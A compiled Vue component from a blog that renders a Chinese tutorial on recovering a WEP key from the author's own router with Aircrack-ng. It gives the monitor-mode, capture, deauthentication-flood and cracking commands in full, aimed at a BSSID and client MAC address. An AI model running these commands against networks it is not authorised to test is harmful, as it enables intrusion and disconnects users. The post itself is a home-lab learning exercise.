import{_ as e,o as a,c as i,e as r}from"./app-25fa875f.js";const n="/blog/assets/wep-encryption-c1f3a715.png",c="/blog/assets/wep-decryption-badfbe42.png",s="/blog/assets/wep-crk-router-83c19327.png",d="/blog/assets/wep-crk-init-e1f79b9b.png",o="/blog/assets/wep-crk-mon-e65123f0.png",l="/blog/assets/wep-crk-ifconfig-91e6d14c.png",t="/blog/assets/wep-crk-target-ce325047.png",p="/blog/assets/wep-crk-pkg-161bb0e2.png",h="/blog/assets/wep-crk-result-24555ed6.png",u={},g=r('<h1 id="wireless-wep-cracking-by-aircrack-ng" tabindex="-1"><a class="header-anchor" href="#wireless-wep-cracking-by-aircrack-ng" aria-hidden="true">#</a> Wireless - WEP Cracking by Aircrack-ng</h1><p>Created by : Mr Dk.</p><p>2018 / 12 / 04 16:48</p><p>Nanjing, Jiangsu, China</p><hr><h2 id="concept" tabindex="-1"><a class="header-anchor" href="#concept" aria-hidden="true">#</a> Concept</h2><p>有线等效加密 (<em>Wired Equivalent Privacy, WEP</em>) 又称无线加密协议 (<em>Wireless Encryption Protocol, WEP</em>) 是用于保护无线网络信息安全的一种体制，是 IEEE 802.11 标准的一部分：</p><ul><li>使用 <em>RC4</em> 加密技术保证 <strong>机密性</strong></li><li>使用 <em>CRC-32</em> 校验技术保证 <strong>完整性</strong></li></ul><h2 id="theory" tabindex="-1"><a class="header-anchor" href="#theory" aria-hidden="true">#</a> Theory</h2><h3 id="encryption" tabindex="-1"><a class="header-anchor" href="#encryption" aria-hidden="true">#</a> Encryption</h3><p>使用一个 24-bit 的初始化向量 IV</p><ul><li>将 IV 与密码一起作为 RC4 的密钥</li><li>将数据与其 CRC-32 校验作为明文</li><li>将明文用密钥加密得到密文</li><li>将 IV 与密文一起发送</li></ul><p><img src="'+n+'" alt="wep-encryption"></p><h3 id="decryption" tabindex="-1"><a class="header-anchor" href="#decryption" aria-hidden="true">#</a> Decryption</h3><p>得到 IV 与密文</p><ul><li>将提取出的 IV 与密码一起作为 RC4 的密钥</li><li>用密钥将密文解密为明文</li><li>从明文中提取出数据和 CRC-32 校验</li></ul><p>将数据进行 CRC-32 校验，并与提取出的校验和进行比较。如果校验和相同，则接收端接收到了原始数据。</p><p><img src="'+c+'" alt="wep-decryption"></p><h2 id="tools" tabindex="-1"><a class="header-anchor" href="#tools" aria-hidden="true">#</a> Tools</h2><p><em>Aircrack-ng</em> on <em>Kali Linux x64</em>。Aircrack-ng 是一个分析 IEEE 802.11 标准网络的安全软件，主要功能包括：</p><ul><li>网络侦测</li><li>数据包嗅探</li><li>WEP、WPA、WPA2 破解</li></ul><h2 id="procedure" tabindex="-1"><a class="header-anchor" href="#procedure" aria-hidden="true">#</a> Procedure</h2><h3 id="将路由器配置为-wep-加密模式" tabindex="-1"><a class="header-anchor" href="#将路由器配置为-wep-加密模式" aria-hidden="true">#</a> 将路由器配置为 WEP 加密模式</h3><p><img src="'+s+`" alt="wep-crk-router"></p><p>为了简单起见，将密钥设置为 <code>12345</code>。</p><h3 id="插入无线网卡并查看是否被-os-识别" tabindex="-1"><a class="header-anchor" href="#插入无线网卡并查看是否被-os-识别" aria-hidden="true">#</a> 插入无线网卡并查看是否被 OS 识别</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ ifconfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+d+`" alt="wep-crk-init"></p><p>可以看到插入的 USB 网卡已被识别，并被命名为 <code>wlan0</code>。</p><h3 id="将网卡设置为监控模式" tabindex="-1"><a class="header-anchor" href="#将网卡设置为监控模式" aria-hidden="true">#</a> 将网卡设置为监控模式</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ airmon-ng start wlan0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+o+`" alt="wep-crk-mon"></p><h3 id="查看网卡是否已进入监控模式" tabindex="-1"><a class="header-anchor" href="#查看网卡是否已进入监控模式" aria-hidden="true">#</a> 查看网卡是否已进入监控模式</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ ifconfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+l+`" alt="wep-crk-ifconfig"></p><p>可以看到 <code>wlan0</code> 网卡进入监控模式后被命名为 <code>wlan0mon</code>。</p><h3 id="使用网卡监控空间内的无线网络通信状态" tabindex="-1"><a class="header-anchor" href="#使用网卡监控空间内的无线网络通信状态" aria-hidden="true">#</a> 使用网卡监控空间内的无线网络通信状态</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ airodump-ng wlan0mon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+t+`" alt="wep-crk-target"></p><p>从所有的设备中选择要破解的目标。</p><h3 id="抓取攻击目标的数据包" tabindex="-1"><a class="header-anchor" href="#抓取攻击目标的数据包" aria-hidden="true">#</a> 抓取攻击目标的数据包</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ airodump-ng -w test -c 11 --bssid 00:6B:8E:5E:7E:E8 wlan0mon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参数信息：</p><ul><li><code>-w</code> 表示数据包写入的文件路径</li><li><code>-c</code> 表示监听的信道 (channel)</li><li><code>--bssid</code> 表示监听设备的 MAC 地址</li><li>最后一个参数为网卡名</li></ul><p><img src="`+p+`" alt="wep-crk-pkg"></p><p>可以看到选定的目标 AP：<code>Mr.Drivingduck</code> 的加密方式为 WEP，有两个客户端连接到了该 AP 上 - 分别是我的 <code>iPhone X</code> &amp; <code>Surface Pro</code>。</p><h3 id="获取大量数据包" tabindex="-1"><a class="header-anchor" href="#获取大量数据包" aria-hidden="true">#</a> 获取大量数据包</h3><p>获取的数据包越多，获取到的 IV 值就越多，破解的概率就越大。可以对连接到该 AP 的客户端使用 <strong>洪泛解除认证攻击</strong>，迫使客户端发送重新连接的数据包，从而获得更多数据包。</p><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ aireplay-ng -0 10 -a 00:6B:8E:5E:7E:E8 -c B8:C1:11:02:B7:05 wlan0mon
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参数信息：</p><ul><li><code>-0</code> 表示洪泛攻击，之后表示洪泛攻击的次数</li><li><code>-a</code> 表示被攻击 AP 的 MAC 地址</li><li><code>-c</code> 表示被攻击客户端设备的 MAC 地址</li><li>最后一个参数为网卡名</li></ul><p>为了方便，我没有使用洪泛攻击的方式获取大量数据包。我使用的方法是，用 <code>Surface Pro</code> 开启百度云盘下载一个很大的文件，从而发出大量数据包。</p><h3 id="利用抓取到的数据包进行破解" tabindex="-1"><a class="header-anchor" href="#利用抓取到的数据包进行破解" aria-hidden="true">#</a> 利用抓取到的数据包进行破解</h3><div class="language-console line-numbers-mode" data-ext="console"><pre class="language-console"><code>$ aircrack-ng -a 1 test-01.cap
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>参数信息：</p><ul><li><code>-a</code> 表示破解模式，<code>1</code> 表示 WEP 破解</li><li>最后的参数为抓取到的数据包文件</li></ul><p><img src="`+h+'" alt="wep-crk-result"></p><p>总共利用了 27563 个数据包，破解出了 5 位的 WEP 密钥。如果使用 13 位密钥，可能需要抓取更多数据包。</p><h2 id="summary" tabindex="-1"><a class="header-anchor" href="#summary" aria-hidden="true">#</a> Summary</h2><p>亲身体验了一次当黑客的感觉。WEP 确实是一个很弱的加密方式，在嗅探到的所有设备里，除了我自己人为设定为 WEP 加密的 AP，其余设备都使用 WPA2 加密。但是这款软件可以将网卡设置为监控模式，还可以发起解除认证洪泛攻击，我认为可以用来测试 <em>kismet</em> 的攻击报警模块，待实验验证。</p>',60),m=[g];function b(v,_){return a(),i("div",null,m)}const k=e(u,[["render",b],["__file","Wireless WEP Cracking by Aircrack-ng.html.vue"]]);export{k as default};
